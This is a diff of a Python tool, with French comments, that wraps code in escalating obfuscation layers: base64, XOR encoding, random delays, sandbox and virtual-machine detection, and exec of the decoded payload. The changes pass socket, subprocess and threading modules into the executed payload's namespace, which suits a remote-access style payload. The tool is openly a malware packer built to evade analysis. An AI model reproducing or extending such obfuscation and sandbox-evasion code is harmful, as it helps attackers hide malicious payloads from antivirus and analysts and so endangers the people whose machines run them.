@@ -289,27 +289,27 @@ if __name__ == '__main__':
         """Niveau 1: Base64"""
         encoded = base64.b64encode(code.encode()).decode()
         return f"""
-import base64, sys, os
+import base64, sys, os, platform, socket, subprocess, json, time, threading
 code = base64.b64decode('{encoded}').decode()
-g = {{'__name__': '__main__', 'sys': sys, 'os': os}}
+g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading}}
 exec(code, g)
 """
 
     def obfuscate_level_2(self, code: str) -> str:
         """Niveau 2: XOR + Base64 + Délais"""
         key = random.randint(1, 255)
-        code_bytes = code.encode('utf-8')
+        code_bytes = code.encode("utf-8")
         xored_bytes = bytes(b ^ key for b in code_bytes)
-        encoded = base64.b64encode(xored_bytes).decode('ascii')
+        encoded = base64.b64encode(xored_bytes).decode("ascii")
         delay = random.randint(1, 3)
 
         return f"""
-import base64, time, sys, os
+import base64, time, sys, os, platform, socket, subprocess, json, threading
 time.sleep({delay})
 key = {key}
 xored = base64.b64decode('{encoded}')
 code = ''.join(chr(b ^ key) for b in xored)
-g = {{'__name__': '__main__', 'sys': sys, 'os': os}}
+g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading}}
 exec(code, g)
 """
 
@@ -322,7 +322,7 @@ exec(code, g)
         delay = random.randint(5, 15)
 
         return f"""
-import base64, time, os, sys
+import base64, time, os, sys, platform, socket, subprocess, json, threading
 def is_sandboxed():
     sandbox_indicators = ["VBoxService", "VBoxTray", "vmtoolsd", "qemu-ga", "sandbox", "virtualbox"]
     try:
@@ -337,7 +337,7 @@ time.sleep({delay})
 key = {key}
 xored = base64.b64decode('{encoded}')
 code = ''.join(chr(b ^ key) for b in xored)
-g = {{'__name__': '__main__', 'sys': sys, 'os': os}}
+g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading}}
 exec(code, g)
 """
 
@@ -350,15 +350,17 @@ exec(code, g)
         delay = random.randint(5, 15)
 
         return f"""
-import base64, time, sys
+import base64, time, sys, os
 socket_module = __import__('socket')
 subprocess_module = __import__('subprocess')
 platform_module = __import__('platform')
+json_module = __import__('json')
+threading_module = __import__('threading')
 time.sleep({delay})
 key = {key}
 xored = base64.b64decode('{encoded}')
 code = ''.join(chr(b ^ key) for b in xored)
-g = {{'__name__': '__main__', 'sys': sys, 'os': os}}
+g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform_module, 'socket': socket_module, 'subprocess': subprocess_module, 'base64': base64, 'json': json_module, 'time': time, 'threading': threading_module}}
 exec(code, g)
 """
 
@@ -371,7 +373,7 @@ exec(code, g)
         delay = random.randint(3, 8)
 
         return f"""
-import base64, time, sys, os
+import base64, time, sys, os, platform, socket, subprocess, json, threading
 def extreme_check():
     try:
         import subprocess
@@ -386,7 +388,7 @@ time.sleep({delay})
 key = {key}
 xored = base64.b64decode('{encoded}')
 code = ''.join(chr(b ^ key) for b in xored)
-g = {{'__name__': '__main__', 'sys': sys, 'os': os}}
+g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading}}
 exec(code, g)
 """
 
